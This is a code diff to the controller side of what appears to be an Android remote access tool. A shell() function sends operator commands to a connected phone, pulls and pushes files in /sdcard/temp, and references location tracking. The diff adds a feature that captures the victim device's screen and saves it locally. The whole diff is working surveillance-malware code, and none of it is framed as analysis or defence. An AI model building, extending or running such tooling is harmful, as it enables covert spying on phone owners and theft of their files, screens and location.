@@ -172,7 +172,6 @@ def shell(client):
             msg1 = msg1.replace("\nEND123\n","")
             filedata = msg1.split("|_|")
             getFile(filedata[0],filedata[1],filedata[2])
-            
         if "putFile" in msg:
             msg=" "
             sendingData=""
@@ -186,13 +185,29 @@ def shell(client):
                 print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
             else:
                 print(stdOutput("error")+"File not exist")
-
+        if "screenshot" in msg:
+            msg = " "
+            print(stdOutput("info")+"\033[0mTaking Screenshot")
+            timestr = time.strftime("%Y%m%d-%H%M%S")
+            filename = "Dumps"+direc+"Screenshot_"+timestr+'.jpg'
+            imageBuffer = recvall(client)
+            imageBuffer = imageBuffer.strip().replace("END123","").strip()
+            if imageBuffer == "":
+                print(stdOutput("error")+"Unable to get screenshot\n")
+            else:
+                with open(filename,'wb') as img:
+                    try:
+                        imgdata = base64.b64decode(imageBuffer)
+                        img.write(imgdata)
+                        print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
+                    except binascii.Error as e:
+                        print(stdOutput("error")+"Not able to decode the Screenshot\n")
         if "Exiting" in msg:
             print("\033[1m\033[33m----------Exiting Shell----------\n")
             return
         msg = msg.split("\n")
         for i in msg[:-2]:
-            print(i)   
+            print(i)
         print(" ")
         command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
         command = command+"\n"
@@ -200,7 +215,7 @@ def shell(client):
             client.send("test\n".encode("UTF-8"))
             clear()
         else:
-            client.send(command.encode("UTF-8"))        
+            client.send(command.encode("UTF-8"))
 
 def getLocation(sock):
     msg = "start"
